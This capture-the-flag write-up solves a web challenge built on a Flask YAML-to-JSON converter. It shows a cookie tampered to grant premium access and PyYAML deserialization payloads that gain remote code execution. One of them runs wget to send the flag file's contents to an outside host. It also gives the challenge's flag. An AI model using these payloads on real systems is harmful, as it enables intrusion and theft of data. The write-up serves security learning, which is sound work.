# Challenge Name: Yaml-2-Json




![date](https://img.shields.io/badge/date-17.04.2021-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![misc category](https://img.shields.io/badge/category-Web-blueviolet.svg)   
![level](https://img.shields.io/badge/level-Medium-blue.svg)
![score](https://img.shields.io/badge/score-50-blue.svg)

## Description

Checkout my useful tool to convert YAML to JSON format. http://yaml-2-json.ctf2021.hackpack.club

Hint : flag.txt is located in /tmp/flag.txt

## Detailed solution

Starting by opening the challenge link https://yaml-2-json.ctf2021.hackpack.club/ 

It's a flask app that Parse any YAML to JSON 

![image](https://user-images.githubusercontent.com/72421091/115270968-60d2e900-a12c-11eb-8c71-51920603e28d.png)

We can see a text a the end of the page  

```
you must have a premium account to access all the features
```

Checking the request headers we can see that we have a cookie 
  
```
cookie: _890f5=http://192.168.181.16:10993; premium=false
``` 
Let's change premium value to true ```premium=true```  

``` 
curl 'https://yaml-2-json.ctf2021.hackpack.club/' \
  -H 'authority: yaml-2-json.ctf2021.hackpack.club' \
  -H 'cache-control: max-age=0' \
  -H 'sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'sec-fetch-site: none' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-user: ?1' \
  -H 'sec-fetch-dest: document' \
  -H 'accept-language: en-US,en;q=0.9,ar;q=0.8,fr;q=0.7' \
  -H 'cookie: _890f5=http://192.168.181.16:10993; premium=true' \
  --compressed
``` 
Output 

![image](https://user-images.githubusercontent.com/72421091/115272571-118db800-a12e-11eb-8851-ba9552fb9de3.png)  

Our app is a flask app which is a micro web framework written in Python. The app use YAML to parse any YAML to JSON.  

There's a known vulnerability in PyYamal, a deserialization RCE attack

https://dl.packetstormsecurity.net/papers/general/yaml-deserialization.pdf

I started by a payload to run the command "ls" to list the files in your current directory 

```
!!python/object/apply:subprocess.check_output ["ls"]
``` 

![image](https://user-images.githubusercontent.com/72421091/115276930-2d478d00-a133-11eb-9d1f-2f27b89a6c32.png)


We can see all the files in the current directory /app 

The hint from description mention that flag.txt is located in /tmp/flag.txt 

So we need to read the /tmp/flag.txt to get our flag  

The method used is kinda limit to simple commands like ls,pwd.. 

We can use os.system which can execute many commands but the probleme is that the output is blind we only get **0** if the command is successful 

![image](https://user-images.githubusercontent.com/72421091/115275175-025c3980-a131-11eb-8444-63c14c8967cc.png)

I'm gonna use curl to print the command output to my python web server 

Payload : ```!!python/object/apply:os.system ["wget http://10.10.10.10:8080/?`cat /tmp/flag.txt`"]```

![image](https://user-images.githubusercontent.com/72421091/115277357-b4950080-a133-11eb-9195-168e9b0f9789.png)


![image](https://user-images.githubusercontent.com/72421091/115276504-9ed30b80-a132-11eb-9ca7-0ff3dec4c682.png)

Decode the url encoded ```flag%7BPy_PyYaml_Yaml_Py%7D``` and we got our flag  

## Flag

```
flag{Py_PyYaml_Yaml_Py}
```
